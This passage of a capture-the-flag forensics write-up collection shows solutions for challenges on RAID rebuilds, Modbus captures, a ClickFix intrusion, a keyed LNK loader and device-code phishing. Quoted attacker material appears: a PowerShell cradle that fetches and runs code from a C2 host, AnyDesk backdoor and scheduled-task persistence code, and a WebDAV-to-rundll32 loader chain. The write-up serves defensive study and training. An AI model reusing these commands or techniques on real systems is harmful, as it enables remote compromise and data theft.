Screenshot: `core_nodes.py` output (a few records + the raw heap dump)

#### 4. Walk the list from the CSCTF head

| Node | Text | → next |
| --- | --- | --- |
| 0x…173c0 | `CSCTF` | 0x…17450 |
| 0x…17450 | `{20_` | 0x…17570 |
| 0x…17570 | `dock` | 0x…174e0 |
| 0x…174e0 | `_mov` | 0x…17330 |
| 0x…17330 | `e_orc` | 0x…17300 |
| 0x…17300 | `hard_` | 0x…175d0 |
| 0x…175d0 | `elm_` | 0x…17630 |
| 0x…17630 | `grove` | 0x…17390 |
| 0x…17390 | `_dus` | 0x…172d0 |
| 0x…172d0 | `k_866` | 0x…17690 |
| 0x…17690 | `59c}` | NULL |

The trap: the decoy lists share nodes with the real one. `_bridge` and `_at_two` also point into the `k_866` → `59c}` tail. Gluing fragments together by eye gives a believable but wrong order. Following the `next` pointers from the `CSCTF` head is the only reliable way.

**Flag:** `CSCTF{20_dock_move_orchard_elm_grove_dusk_86659c}`

#### Takeaways

- `strings` only shows printable bytes and hides the pointers and lengths that give the data its structure. For memory forensics, rebuild the actual data structures.
- Core dumps map memory through `PT_LOAD` segments: translate virtual address → file offset before reading heap or stack data.
- glibc chunk headers (the `0x31` size field) help you spot struct boundaries and sizes on the heap.
- Tools: `gdb relay.core` (`x/6gx addr`), `readelf -l`, Volatility for full-system RAM images.

---

### 39. Operation Dawn: The Burnt Server

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{04_flint_arc_eastward_relay_6aa299}`

#### Challenge

A hospital logistics archive was destroyed and only two storage members survived. We have to recover the train movement register. Attachment: `server-remains.tar` → `disk0.img`, `disk2.img` (2 MiB each), `SALVAGE.txt`.

#### 1. Read the salvage record

```bash
tar -xvf server-remains.tar
cat SALVAGE.txt
xxd disk0.img | head; xxd disk2.img | head
mdadm --examine disk0.img   # no md superblock
```

What the record tells us: **three identical drives** in a hot rack, the centre one (slot 1) burnt, and the controller settings lost. There's no mdadm superblock, so the array parameters are unknown. Three disks that can survive losing one means **RAID 5**. (`file` calls disk0 an “OpenPGP Secret Key”, but that's a false positive on random-looking bytes.)

Screenshot: `SALVAGE.txt` + `xxd` heads of both disks
#### 2. Rebuild the missing drive with parity

In RAID 5, every stripe has two data chunks and one parity chunk, where `P = D_a ⊕ D_b`. With 3 disks, any missing chunk is the XOR of the other two, whatever the layout:

```
disk1 = disk0 ⊕ disk2
```

Quick check on the first bytes: `95 da 7c ⊕ 7e e6 ec = eb 3c 90`. That's the **FAT boot sector jump**, so the first data chunk lived on the burnt disk 1 and parity for stripe 0 was on disk 0. That points to a **right-** md layout.

#### 3. Brute-force the layout and chunk size

`raid5_rebuild.py` tries the 4 md layouts × chunk sizes from 512 B to 512 KiB and checks each assembled volume:

- it has a FAT boot sector (`EB 3C 90` … `55 AA`);
- **FAT mirror check**: FAT keeps two identical copies of its table, and they only match if the stripes are in the right order;
- `fls` lists the files, and the files actually decompress.

```bash
python3 raid5_rebuild.py disk0.img disk2.img
```

Result: chunk sizes below 64 KiB fail the mirror check. At **64 KiB, right layout**, the volume has a FAT mirror match, 6 entries, 2 files that decompress, and 1 flag hit. Larger chunks pass the mirror check (both FATs sit inside the first chunk) but corrupt the files.

Screenshot: script output table (fat_mirror / files / decompressible / flag_hits)
#### 4. Recover the deleted register

Volume label `DAWN ARCH`. Files: `ROSTER.TXT`, `WARDS.TXT`, `MANIFEST.TXT`, `SIGNALS.TXT`, and `_RAIN.GZ`.

`_RAIN.GZ` is the **deleted `TRAIN.GZ`**. When FAT deletes a file it overwrites the first character of the 8.3 name with `0xE5`, but the directory entry and clusters stay until they're reused.

```bash
fls -r -p volume.img
icat volume.img 8 | gunzip | grep -o 'CSCTF{[^}]*}'
```

Screenshot: `fls` file list + decompressed register with the marker
![2026-11-06_151257.png](images/2026-11-06_151257.png)

![2026-11-06_151334.png](images/2026-11-06_151334.png)

**Flag:** `CSCTF{04_flint_arc_eastward_relay_6aa299}`

#### Takeaways

- RAID 5 survives losing one disk because of XOR parity. With 3 members, `missing = A ⊕ B` no matter which stripe holds parity.
- With no controller metadata, find the geometry (layout, chunk size, disk order) by brute force and score it with filesystem consistency checks such as FAT mirror equality and files that parse or decompress.
- A file signature in the rebuilt data (`EB 3C 90`) gives away where parity sits in the stripes.
- Deleted FAT files keep their directory entry with `0xE5` as the first byte. Sleuth Kit recovers them directly.

---

### 40. CAPTCHA the Water Plant

*Forensics · Easy · 166 pts*

**Flag:** `CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}`

#### Challenge

Nordvia Water Utility lost its distribution-control panel after an administrator account was used from one of three laptops. We get KAPE triage collections that were already parsed with Eric Zimmerman's tools (CSV output) plus a Hindsight browser report. The task: follow the evidence from what the user ran → what it launched → the persistence it left → the browser evidence it exposed.

Attachments: `ENG-LAPTOP-23.zip`, `OPS-NB-06.zip`, `FIELD-WKS-21.zip` (our download of FIELD-WKS-21 was 0 bytes; it wasn't needed).

#### 1. What the user ran — RunMRU (ClickFix)

A fake “I'm not a robot” CAPTCHA page copies a command to the clipboard and tells the user to press Win+R and paste it. Win+R history is kept in `NTUSER\\…\\Explorer\\RunMRU`, which RECmd's UserActivity batch parses.

```bash
grep -i RunMRU */*/Registry/*UserActivity_Output.csv
```

Only **OPS-NB-06** (user `ops06.nwu`, 2026-10-21 04:30:47) has a malicious entry:

```
powershell.exe -nop -ep Bypass "[System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData('http://zindetify.dev.boot:8080/validator')) | iex"
```

This is a fileless download cradle: the payload is fetched and passed straight to `iex` (Invoke-Expression), so nothing is written to disk.

**Screenshot 1:** run this in `~/water` and capture the output (ENG-LAPTOP-23 RunMRU is empty, OPS-NB-06 has the PowerShell cradle)
```bash
cd ~/water
grep -i "RunMRU" */*/Registry/*UserActivity_Output.csv | cut -c1-420
```

#### 2. What it launched — PowerShell script block logging (4104)

Event 4104 records the content of every script block that runs, including in-memory payloads. Long scripts are split across several events, so they have to be rebuilt by `ScriptBlockId` + `MessageNumber` (a Python parser over the EvtxECmd CSV does this). It writes every block to `ops_scriptblocks.txt`:

```bash
cd ~/water
python3 - <<'EOF'
import csv, json, sys, os, collections
csv.field_size_limit(sys.maxsize)
d = "OPS-NB-06/Kape-parsed-OPS-NB-06/EventLogs/"
f = d + os.listdir(d)[0]
blocks = collections.defaultdict(dict); first = {}
for r in csv.DictReader(open(f, encoding="utf-8-sig")):
    if r["EventId"] != "4104" or r["TimeCreated"] < "2026-10-21 04:30": continue
    try: x = {e["@Name"]: e.get("#text", "") for e in json.loads(r["Payload"])["EventData"]["Data"]}
    except Exception: continue
    sid = x.get("ScriptBlockId"); blocks[sid][int(x.get("MessageNumber", 1))] = x.get("ScriptBlockText", "")
    first.setdefault(sid, r["TimeCreated"])
with open("ops_scriptblocks.txt", "w") as o:
    for sid in sorted(blocks, key=lambda s: first[s]):
        o.write(f"\n===== {first[sid]}  {sid}  parts={len(blocks[sid])}\n")
        o.write("".join(blocks[sid][k] for k in sorted(blocks[sid])) + "\n")
print("wrote ops_scriptblocks.txt,", len(blocks), "script blocks")
EOF
```

The payload (04:30:50) buries its real code behind about 50 junk `Get-DataXX` functions that return fake error and telemetry strings, as noise. The real actions:

- downloads `AnyDesk.exe` from `http://zindetify.dev.boot:8080/tool` to `C:\\temp\\Maitenance\\Setup\\`
- installs it silently with `--start-with-win`, creating a remote-access backdoor
- sets the unattended-access password:

```powershell
Start-Process ... AnyDesk.exe -ArgumentList "--set-password `"f@k3_c@ptch@`""
```

→ Flag piece 1: `f@k3_c@ptch@`

**Screenshot 2:** after building `ops_scriptblocks.txt`, run this and capture the AnyDesk download, install and `--set-password "f@k3_c@ptch@"` lines
```bash
cd ~/water
awk '/abfcd91b-c90f-4b51/{f=1;next} /^=====/{f=0} f' ops_scriptblocks.txt | tr ',' '\n' | grep -iE "AnyDesk|DownloadUrl|set-password"
```

#### 3. Persistence — Scheduled task

The same payload registers a daily task:

```powershell
$taskTrigger = New-ScheduledTaskTrigger -Daily -At 11:10AM
$taskAction  = New-ScheduledTaskAction -Execute "PowerShell" -Argument "-NoProfile -ExecutionPolicy Bypass ...validator')) | iex"
Register-ScheduledTask 'Maitenance Check ...' -Action $taskAction -Trigger $taskTrigger -Description (Get-Data51)
```

`Get-Data51` fetches the description from the C2 (`/config`). `Persistence/Scheduled Tasks.csv` (UTF-16, so convert it with `iconv` first) shows the stored value:

```bash
iconv -f utf-16 -t utf-8 "Persistence/Scheduled Tasks.csv" | grep -i maitenance
```

Task: `\\Maitenance Check` (misspelled), run as `ops06.nwu`, daily at 11:10, with Comment `_r3@l_m@lw@r3`. The task fired again on 2026-10-21 at 15:10, and the same cradle appears in 4104.

→ Flag piece 2: `_r3@l_m@lw@r3`

**Screenshot 3:** run both commands and capture them together: the task-creation code from the payload, then the stored task showing Comment = `_r3@l_m@lw@r3`
```bash
cd ~/water
awk '/abfcd91b-c90f-4b51/{f=1;next} /^=====/{f=0} f' ops_scriptblocks.txt | tr ',' '\n' | grep -iE "ScheduledTask|Get-Data51"
iconv -f utf-16 -t utf-8 "OPS-NB-06/Kape-parsed-OPS-NB-06/Persistence/Scheduled Tasks.csv" | grep -i "Maitenance" | awk -F'","' '{print "TaskName : "$2"\nTaskToRun: "$9"\nComment  : "$11"\nRunAs    : "$15}'
```

#### 4. Browser evidence — Hindsight (Edge history)

```bash
cd ~/water
pip install openpyxl --break-system-packages -q
python3 - <<'EOF'
import openpyxl, glob
for f in glob.glob("*/*/WebBrowsers/Hindsight_output.xlsx"):
    wb = openpyxl.load_workbook(f, read_only=True)
    out = open(f.split("/")[0] + "_hindsight.txt", "w")
    for ws in wb.worksheets:
        for row in ws.iter_rows(values_only=True):
            out.write(ws.title + " | " + " | ".join("" if c is None else str(c) for c in row) + "\n")
    print("wrote", out.name)
EOF
```

Before the compromise, `ops06.nwu` only had operator tokens (`NVW-OPS-892…`, `NVW-OPS-739…`). On **2026-10-28 03:54** there's a login as **admin** from this laptop, with the session token exposed in the URL:

```
http://admin-control.nordvia-water.test:8080/admin-dashboard?token=NVW-ADMIN-cl1ckf1xed
```

→ Flag piece 3: `cl1ckf1xed`

ENG-LAPTOP-23 was a decoy: normal browsing (real reCAPTCHA on Google/Reddit) and a legitimate engineer login.

**Screenshot 4:** after creating `OPS-NB-06_hindsight.txt`, run this and capture the token timeline (OPS tokens first, then `NVW-ADMIN-cl1ckf1xed` on 2026-10-28)
```bash
cd ~/water
grep -iE "admin-dashboard\?token=" OPS-NB-06_hindsight.txt | cut -d'|' -f3,4 | sort -u
```

**Screenshot 5 (final):** assemble the three pieces
![2026-11-06_153018.png](images/2026-11-06_153018.png)

```bash
echo "CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}"
```

**Flag:** `CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}` (“fake captcha, real malware, clickfixed”)

#### Takeaways

- **ClickFix** abuses the user to run the payload, so the first artifact is **RunMRU**, not a downloaded file.
- Enable **PowerShell Script Block Logging (4104)**: it captured the full fileless payload. Remember to rebuild multi-part blocks.
- Common follow-ups to look for: a legitimate RMM tool (AnyDesk) with a set password, and scheduled tasks with misspelled “maintenance” names.
- Session tokens in URL query strings end up in browser history, where an attacker on the host can reuse them.
- **Defense:** restrict Win+R/PowerShell for standard users (AppLocker/WDAC), alert on `powershell … | iex` in RunMRU and 4104, block unapproved RMM tools, and keep tokens out of URLs (use cookies/headers).

---

### 41. Interlock Witness

*Forensics · Medium · 270 pts*

**Flag:** `CSCTF{1198b297c84064fab89d0f3e3e5308791165333c1b64da17185dd51493b6f339}`

#### Challenge

A grid-support controller accepted Modbus/TCP maintenance writes while the response-cell interlock was false. We have to rebuild the **accepted** target writes that broke the offline safety policy and hash them into a witness. Attachment: `interlock-witness.zip` → `interlock.pcapng` (512 packets, one TCP session on port 502), `interlock-policy.md`, `register-map.md`, `witness-format.md`, `README.txt`, `provenance.json`.

#### 1. Read the spec

- **Register map** (zero-based PDU addresses): `0x0A` maintenance_permit, `0x0B` isolation_state, `0x0C` protection_armed, `0x13` trip_limit, `0x14` restore_delay.
- **Accepted FC16** (Write Multiple Registers): the reply goes the other way (server→client) with matching transaction ID, protocol ID, unit ID and FC 16, and echoes the start address and quantity. Exception replies (`0x90`) never change state. The new values take effect *after* the normal reply.
- **Target** = quantity 1 at `0x13` or `0x14`. It's **unsafe** if permit, isolation or armed ≠ 1 immediately before its reply.
- **Witness**: `T` = for each unsafe target, in reply order, request PDU ‖ reply PDU (no MBAP header). `W = SHA-256("INTERLOCK-WITNESS/1\\0" ‖ T)`. A test vector is provided.

**Screenshot 1:** archive contents + the three spec files
```bash
cd ~/interlock
unzip -l ~/Downloads/interlock-witness.zip
cat interlock-policy.md register-map.md witness-format.md
```

#### 2. Look at the Modbus traffic

Modbus/TCP frame = MBAP header (transaction ID, protocol ID 0, length, unit ID) + PDU (function code + data). FC16 request PDU: `10 | start(2) | qty(2) | byte_count(1) | values`. Normal reply: `10 | start(2) | qty(2)`.

The client alternates FC16 writes to `0x13`/`0x14` with FC3 reads of the 11 registers starting at `0x0A`. The first read shows `permit=0, isolation=0, armed=1`.

**Screenshot 2:** first Modbus exchanges (writes + read-back of the interlock words)
```bash
cd ~/interlock
tshark -r interlock.pcapng -Y modbus -T fields -e frame.number -e mbtcp.trans_id -e mbtcp.unit_id -e modbus.func_code -e modbus.reference_num -e modbus.word_cnt -e modbus.regval_uint16 | head -30
```

#### 3. Solver logic (`interlock_solve.py`)

1. Check the witness-format test vector first, to prove the hash format is right.
2. Rebuild both TCP byte streams from sequence numbers and split them into MBAP frames ourselves. A single TCP segment can hold several Modbus messages, so per-packet dissection can't be trusted.
3. Pair each reply with its pending request by transaction ID. Ignore replies with the wrong unit or protocol ID, and reject exception or non-echoing replies.
4. Walk events in **server reply order**, starting from the state of the first FC3 read. Classify each target against the state just before its reply, then apply the written values.
5. Build `T` from the unsafe targets and print `CSCTF{sha256(P‖T)}`.

```bash
python3 interlock_solve.py interlock.pcapng | tee solve_out.txt
```

**Screenshot 3:** KAT check, initial state, the 8 non-target writes and every UNSAFE target
```bash
cd ~/interlock
grep -E "KAT|initial state|other|UNSAFE" solve_out.txt
```

#### 4. What happened

| Window | Interlock state | Writes |
| --- | --- | --- |
| tid 4–18 | permit=0, isolation=0 (not yet authorised) | 8 unsafe targets |
| tid 19–20 | permit → 1, isolation → 1 | prerequisite writes |
| tid 22–124 | all three = 1 | safe targets |
| tid 125 | isolation → **0** (station reconnected) | prerequisite write |
| tid 127–141 | isolation=0 | 8 unsafe targets |
| tid 142 | isolation → 1 | prerequisite write |
| tid 248/250/252 | — | acknowledgement writes to `0x18–0x1A` |

Cross-check with the policy: **8 accepted non-target FC16 writes** (5 prerequisite + 3 acknowledgement), exactly as stated. There were 16 unsafe targets, so `len(T) = 16 × (8 + 5) = 208` bytes.

**Screenshot 4:** the isolation drop at tid 125 and the first unsafe write after it, straight from the capture
```bash
cd ~/interlock
tshark -r interlock.pcapng -Y "mbtcp.trans_id >= 124 && mbtcp.trans_id <= 128" -T fields -e frame.number -e mbtcp.trans_id -e modbus.func_code -e modbus.reference_num -e modbus.regval_uint16
```

**Screenshot 5 (final):** summary + flag

```bash
cd ~/interlock
tail -5 solve_out.txt
```

**Flag:** `CSCTF{1198b297c84064fab89d0f3e3e5308791165333c1b64da17185dd51493b6f339}`

#### Takeaways

- Modbus has **no authentication or interlock enforcement**: the controller accepts any syntactically valid write, so safety logic must be enforced elsewhere (and audited from captures).
- “Accepted” means a matching normal reply. Pair requests and replies by transaction ID and check the echo, rather than trusting the request alone.
- Evaluate state in the order the controller acknowledged writes, and apply each write's values only after its reply.
- Use the spec's own cross-checks (test vector, “8 other writes”) to confirm the answer before submitting a hash-based flag.
- **Defense:** enforce interlocks in PLC logic or a Modbus-aware firewall/DPI that blocks setpoint writes while permit/isolation is false, and alert on FC16 to protection registers.

---

### 42. Briefing for One

*Forensics · Medium · 270 pts*

**Flag:** `CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}`

#### Challenge

An intruder staged a routing package that only one workstation can open. We have to recover it and submit its briefing token, working **statically only**: no running the shortcut or loading the DLL. Attachment: `briefing.lnk`, `machine-cryptography.hiv` (saved `HKLM\\SOFTWARE\\Microsoft\\Cryptography` subkey), `egress.pcapng` (WebDAV over HTTP/80), `field-guide.md`, `provenance.json`, `SHA256SUMS`.

**Screenshot 1:** evidence inventory + field guide (contains the HMAC test vector)
```bash
cd ~/briefing
unzip -l ~/Downloads/briefing-for-one-5f4125fbb77f625d.zip
sha256sum -c SHA256SUMS
cat field-guide.md
```

#### 1. Parse the shortcut (without running it)

```bash
pip install LnkParse3 --break-system-packages -q
lnkparse -a briefing.lnk
```

The LNK target is `powershell.exe`, and the full loader is in the **command-line arguments**:

1. Gate: `permit.bin` must exist (32 bytes, fixed SHA-256). It only decides whether the script runs and isn't needed for analysis.
2. Reads `HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid` and lowercases it.
3. `password = hex(HMAC-SHA256(key = base64("eyy//ntonkO5y+zE61CW4ddRSUWiWBgzwe3ra1tENd8="), msg = "csctf26/briefing-for-one/v1" ‖ 0x00 ‖ guid))`
4. Copies `\\\\briefing.rovenqara.test@80\\DavWWWRoot\\ops\\route-update.7z` over **WebDAV** and checks SHA-256 `d29a0679…e4c2`.
5. `7z x -p<password>` → `route-update.dll` + `route-table.json` (hash-checked), then `rundll32 route-update.dll,ApplyRouteTable`.

This is **environmental keying**: MachineGuid is unique to each Windows install, so the package only decrypts on the one target machine (“briefing for one”). Sandboxes and other analysts' machines get nothing. The LNK's tracker block also leaks the build machine: `desktop-mdl28su`, MAC `00:50:56:3D:9D:C6` (VMware), volume serial `0x267C5711`, and SID `S-1-5-21-…-1001`.

**Screenshot 2:** LNK command-line arguments (key derivation + WebDAV path) and the tracker block
```bash
cd ~/briefing
lnkparse -a briefing.lnk | sed -n '/DATA:/,/EXTRA:/p'
lnkparse -a briefing.lnk | grep -A6 "DISTRIBUTED LINK TRACKER"
```

#### 2. Get MachineGuid from the saved hive

The hive is a saved subkey, so the **root of the file is the Cryptography key** itself. Full-hive paths like `Microsoft\\Cryptography` don't exist inside it.

**Screenshot 3:** MachineGuid read from the hive root
```bash
cd ~/briefing
pip install python-registry --break-system-packages -q
python3 -c "from Registry import Registry; r=Registry.Registry('machine-cryptography.hiv').root(); print(r.path()); [print(v.name(),'=',v.value()) for v in r.values()]"
```

Result: `MachineGuid = 080c7be1-f41c-446c-b961-93bd7bc4ea31`

#### 3. Derive the archive password

First we check the HMAC construction against the field-guide test vector (`7dad6991…10d0`), then compute the real password:

**Screenshot 4:** KAT check + real password
```bash
cd ~/briefing
python3 - <<'EOF'
import hmac, hashlib, base64
D = b"csctf26/briefing-for-one/v1" + b"\x00"
kat = hmac.new(bytes(range(32)), D + b"00112233-4455-6677-8899-aabbccddeeff", hashlib.sha256).hexdigest()
print("KAT     :", kat, kat == "7dad69912b67470da7713c666337135b568030605bc2e88f99524596366d10d0")
k = base64.b64decode("eyy//ntonkO5y+zE61CW4ddRSUWiWBgzwe3ra1tENd8=")
pw = hmac.new(k, D + b"080c7be1-f41c-446c-b961-93bd7bc4ea31", hashlib.sha256).hexdigest()
print("password:", pw); open("password.txt", "w").write(pw)
EOF
```

Password: `ee731407a271c8aa4b92f93d362591626421d32465aeba3f912ac09c576dc6c0`

#### 4. Recover the archive from the WebDAV capture

`tshark --export-objects http` exports every HTTP body: the PROPFIND XML (`%2f`, `ops`), **three 914-byte `route-update.7z` decoys** (SHA-256 `d7d8fcb1…`), and one 5359-byte object. Only the one whose hash matches the LNK (`d29a0679…`) is the real package.

**Screenshot 5:** exported HTTP objects and their hashes (only `route-update(3).7z` matches)
```bash
cd ~/briefing
mkdir -p http_objs && tshark -r egress.pcapng -q --export-objects http,http_objs
ls -l http_objs; sha256sum http_objs/*
cp "http_objs/route-update(3).7z" route-update.7z
```

#### 5. Decrypt and read the route table (do not run the DLL)

The 7z uses AES-256 with encrypted headers (`7zAES`), so only the right password even lists the files.

**Screenshot 6 (final):** extraction, hash check against the LNK values, and the token
![2026-11-06_154645.png](images/2026-11-06_154645.png)

```bash
cd ~/briefing
7z x -p"$(cat password.txt)" -opkg -y route-update.7z
sha256sum pkg/*
cat pkg/route-table.json; echo
```

`route-table.json`: `{"schema":1,"briefing_token":"CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}","routes":[…]}`

**Flag:** `CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}`

#### Takeaways

- A malicious LNK often holds the **whole loader** in its arguments. Parse it with LnkParse3 or LECmd instead of running it.
- **Environmental keying** (MachineGuid, hostname, volume serial) defeats sandboxes, but if the victim's registry is in the evidence, the key can be rebuilt offline.
- A saved registry subkey has that key as its root, so adjust paths when you parse it.
- HTTP object export pulls out decoys too. Always pick the object whose **exact bytes** match the expected hash.
- **Defense:** block `.lnk` launching PowerShell from mail or downloads, disable the WebClient (WebDAV) service where it isn't needed, block outbound `@80\\DavWWWRoot` UNC paths, and alert on PowerShell → 7z → rundll32 process chains.

---

### 43. Code Red Freight

*Forensics*

**Flag:** `CSCTF{D3VC0DE-R3L4Y_M4N1F3ST-L3AK_4}`

#### Challenge

Defence-consignment manifests from Tarnovel Rail Freight are reaching an outside mailbox. Using the dispatcher's (Patti Fernandez) identity logs, the mailbox audit and the phishing lure, we have to find **the device the adversary controls**, **the rule leaking the manifests** and **how many files they downloaded**. Evidence: Entra `AuditLogs`, `InteractiveSignIns`, `NonInteractiveSignIns`, Purview `UnifiedAuditLog_Patti.csv`, and two lure screenshots (email + device-code page).

#### Attack summary: device-code phishing → device registration → inbox rule

1. The lure sends Patti to `microsoft.com/devicelogin` with a code generated by the attacker. When she enters it and signs in (MFA included), the attacker's polling client receives her tokens.
2. The attacker used those tokens against the **Device Registration Service** to join their own device to Entra ID. That gives persistent, “trusted” access that a password reset alone won't remove.
3. From that device they created a forwarding inbox rule and downloaded files from OneDrive/SharePoint.

Triage script: `codered_triage.py` (summarises all four exports; output saved to `triage.txt`).

```bash
cd ~/codered
python3 codered_triage.py > triage.txt
```

#### 1. The device-code sign-in

Only one sign-in uses `Authentication Protocol = deviceCode`: 2026-10-29 15:04:55 from **203.0.113.77 (Montreal, CA)**, app *Microsoft Authentication Broker*, resource *Device Registration Service*, session `009d0b3a…`. Patti's normal IP is **198.51.100.24 (Bucharest/Timișoara, RO)**.

**Screenshot 1:** the deviceCode sign-in + attacker IP rows (Azure AD joined device)
```bash
cd ~/codered
sed -n '/device-code/,+1p' triage.txt
grep "203.0.113.77" triage.txt | grep -E "deviceCode|Azure AD joined" | head -8
```

#### 2. Device the adversary controls → `D3VC0DE-R3L4Y`

Seven seconds after the device-code sign-in, Entra logs **Register device** from `203.0.113.77`, plus *Add registered owner/users to device* with Patti as owner, for device `D3VC0DE-R3L4Y` (object ID `51fc6b44…`). From then on, every sign-in from that IP carries device ID `95caec44…` with join type *Azure AD joined*.

Decoy: `R3M0TE-W0RK-PC` was registered on 10/28 from Patti's own IP (198.51.100.24). That's her legitimate laptop.

**Screenshot 2:** Entra audit log showing both device registrations (malicious on 10/29 from 203.0.113.77, legit on 10/28)
```bash
cd ~/codered
sed -n '/ENTRA AUDIT LOGS/,/INTERACTIVE SIGN-INS/p' triage.txt | grep -iE -A2 "Register device|registered owner"
```

#### 3. Rule leaking manifests → `M4N1F3ST-L3AK`

`New-InboxRule` at 15:28:57 from `203.0.113.77`, same session `009d0b3a…`, `DeviceId 95caec44…`:

- `Name = M4N1F3ST-L3AK`
- `ForwardTo = ragubarden@proton.me` (external mailbox)
- `StopProcessingRules = True`

Decoy: the `Newsletters` rule (10/28, from Patti's IP) only moves newsletters into a folder.

**Screenshot 3:** both New-InboxRule events with their key parameters
```bash
cd ~/codered
sed -n '/mailbox rule/,/file activity/p' triage.txt | grep -E "New-InboxRule|DeviceId|SessionId|\"Name\"|\"Value\""
```

#### 4. Files downloaded → `4`

There are 4 `FileDownloaded` events in the unified audit log, all from `203.0.113.77`, with no duplicate RecordIds. Patti herself has no downloads.

**Screenshot 4:** every FileDownloaded event with time, IP and file name
```bash
cd ~/codered
python3 -c "import csv,json,sys,glob;csv.field_size_limit(sys.maxsize);[print(r['CreationDate'],a.get('ClientIP'),a.get('SourceFileName')) for r in csv.DictReader(open(glob.glob('code_red_freight/logs/UnifiedAuditLog_*.csv')[0])) for a in [json.loads(r['AuditData'])] if r['Operation']=='FileDownloaded']"
grep -E "^count|FileDownloaded" triage.txt
```

#### Timeline (2026-10-29 UTC)

| Time | Event | Source |
| --- | --- | --- |
| 15:04:55 | deviceCode sign-in → Device Registration Service | 203.0.113.77 (CA) |
| 15:05:02 | Register device `D3VC0DE-R3L4Y`, Patti as owner | 203.0.113.77 |
| 15:05+ | Sign-ins as Azure AD joined device `95caec44…` (OWA, Teams, Exchange) | 203.0.113.77 |
| 15:28:57 | New-InboxRule `M4N1F3ST-L3AK` → `ragubarden@proton.me` | 203.0.113.77 |
| — | 4 × FileDownloaded | 203.0.113.77 |

**Flag:** `CSCTF{D3VC0DE-R3L4Y_M4N1F3ST-L3AK_4}`

#### Takeaways

- Device-code phishing shows up as `Authentication Protocol = deviceCode` in the sign-in logs. Hunt for it, especially when the resource is **Device Registration Service**.
- An attacker who registers a device gets persistence that survives a password reset. Containment must also **delete the rogue device** and revoke sessions and refresh tokens.
- Separate attacker from user by IP, location, session ID and device ID, and exclude legitimate look-alikes (`R3M0TE-W0RK-PC`, `Newsletters`).
- **Defense:** block the device-code flow with Conditional Access (Authentication flows), require MFA plus compliant devices for device registration, alert on inbox rules that forward externally, and disable external auto-forwarding in Exchange.

---

### 44. Dawn Array

*Forensics · Medium · 293 pts*

**Flag:** `CSCTF{dawn_12d6b2bf2703a884e970e2c4d0070c894c8cf53be91d44feabeb44e18c02eefb}`

#### Challenge

Dispatch gateway E2 issued conflicting turnout-release records and was powered off. Its staging volume lived on a **4-member Linux md RAID-5**: one member is lost and three survive (`acq-1.raw`, `acq-2.raw`, `acq-3.raw`). We have to rebuild the volume read-only, then apply the gateway's **own procedure** (stored on the volume) to find the releases the corridor controller actually acknowledged, and report the release witness.

#### 1. Rebuild the RAID-5 from the md superblocks

Unlike a bare array, each member still has its **md v1.2 superblock** (4 KiB into the disk), which records level, layout, chunk size, data offset, number of disks and the member's slot. `mdadm` wasn't usable (broken dpkg), so `md_rebuild.py` parses the superblocks, rebuilds the missing slot by XOR (`D_missing = D_a ⊕ D_b ⊕ D_c`, true for every stripe whichever chunk is parity), de-stripes with the recorded layout, and writes `volume.img`.

Result: UUID `67662dd6…`, name `rrca-gw-e2:staging`, **left-symmetric**, **32 KiB chunk**, 4 disks, data offset 2048 sectors. Slots 0/2/3 present, **slot 1 rebuilt**. All members have events = 26 (none stale). The ext superblock magic is `0xEF53` and the label is `rrca-staging`.

**Screenshot 1:** superblock fields of the 3 members + rebuild + ext4 check
```bash
cd ~/dawn
python3 md_rebuild.py acq-1.raw acq-2.raw acq-3.raw
```

#### 2. Extract ext4 without mounting

`debugfs` reads ext4 directly from the image. The “Operation not permitted while changing ownership” messages only mean `rdump` can't `chown` to root as a normal user. The files are still extracted.

**Screenshot 2:** files recovered from the volume
```bash
cd ~/dawn
mkdir -p vol && debugfs -R "rdump / vol" volume.img 2>/dev/null
find vol -type f -exec ls -l {} \;
```

Recovered: `usr/share/doc/rrca-dispatch-procedure.txt` (DP-7), `var/lib/rrca/dispatch.sqlite` + **`-wal`** + `-shm` (ledger), `var/log/rrca/dispatch-gateway.syslog` (RFC 5424), `var/log/rrca/controller-access.pcapng` (HTTP/1.1 gateway ↔ controller).

#### 3. The procedure (DP-7)

A cycle is **controller-acknowledged** only if all of these hold:

- **Q1**: exactly one ledger row and exactly one of each syslog phase (PREPARE_SENT, RESPONSE_OBSERVED, READBACK_OBSERVED, COMMIT_WRITTEN) share the same cycle_id, request_id and gateway_seq.
- **Q2**: POST headers and body (revision/register/value) match the ledger, and the response is 201 and echoes both IDs.
- **Q3**: the response revision equals the ledger; the response nonce equals the ledger nonce and the RESPONSE_OBSERVED nonce.
- **Q4**: the GET readback on the same connection returns the same nonce, revision, register and value as the response and the ledger, and READBACK_OBSERVED agrees with the ledger.
- **Q5**: the phases are in order, so the readback is observed before COMMIT_WRITTEN.

Witness = `RRCA-DAWN-WITNESS-v1\\n` followed by one line per qualifying cycle (ascending gateway_seq): `cycle_id|request_id|prepare_revision|reservation_nonce|release_register|release_value\\n`. Flag = `CSCTF{dawn_ + sha256 + }`.

**Screenshot 3:** qualification rules + witness format from the procedure
```bash
cd ~/dawn
sed -n '/^4. Qualification/,$p' vol/usr/share/doc/rrca-dispatch-procedure.txt
```

#### 4. Read the ledger with the WAL applied, safely

The procedure says WAL rows are part of the ledger. Opening the original DB with `sqlite3` would **checkpoint the WAL and change the evidence**, so the solver copies `dispatch.sqlite` + `-wal` to a temporary folder and reads that copy (without the possibly stale `-shm`). Main DB alone: **95** rows. With WAL: **128** rows. 33 cycles exist only in the WAL.

#### 5. Cross-check the three sources (`dawn_witness.py`)

- Syslog: a proper RFC 5424 parser (handles escaped `\\" \\\\ \\]`, exactly one `rrca@32473` element, no duplicate parameters). 512 events = 128 cycles × 4 phases.
- HTTP: rebuilds each of the 128 TCP connections from sequence numbers and splits messages by Content-Length. It checks exactly POST→201 then GET→200, no pipelining, no Transfer-Encoding, JSON objects with string values only, and each request_id POSTed once.
- Every ledger row is then checked against Q1–Q5, with the reason printed for each failure.

```bash
cd ~/dawn
python3 dawn_witness.py vol | tee witness_out.txt
```

Result: **112 of 128 cycles fail**, every one a deliberate conflict:

| Failure | Count | Meaning |
